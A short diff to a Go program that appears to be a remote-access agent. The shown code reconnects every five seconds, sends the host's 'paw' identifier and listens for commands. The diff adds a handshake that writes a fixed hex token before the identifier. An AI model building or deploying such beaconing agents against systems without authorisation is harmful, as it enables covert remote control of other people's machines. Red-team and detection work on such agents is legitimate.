@@ -43,6 +43,11 @@ func listen(conn net.Conn) {
     }
 }
 
+func handshake(conn net.Conn) bool{
+    conn.Write([]byte("94699f9970213dd1d4054ca678f1278a"))
+    return true
+}
+
 func main() {
    host, _ := os.Hostname()
    user, _ := user.Current()
@@ -60,6 +65,7 @@ func main() {
          time.Sleep(5 * time.Second)
          continue
       }
+      handshake(conn)
       conn.Write([]byte(paw))
       listen(conn)
    }
